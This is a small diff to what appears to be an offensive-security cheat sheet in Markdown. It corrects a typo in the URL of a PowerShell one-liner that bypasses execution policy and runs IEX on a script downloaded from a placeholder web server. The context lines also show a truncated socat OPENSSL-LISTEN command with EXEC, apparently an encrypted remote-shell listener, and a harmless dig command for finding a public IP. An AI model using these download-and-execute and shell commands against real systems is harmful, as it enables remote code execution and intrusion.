@@ -62,7 +62,7 @@ B machine (Windows): `socat OPENSSL-LISTEN:$PORT,cert=cert.pem,verify=0,fork EXE
 
 ## Misc
 ### Run powershell script from remote web server
-`powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http:/web-server-ip/script.ps1')`
+`powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://web-server-ip/script.ps1')`
 
 ### Get Public IP
 To get your public IP address on Linux run `dig +short myip.opendns.com @resolver1.opendns.com`  
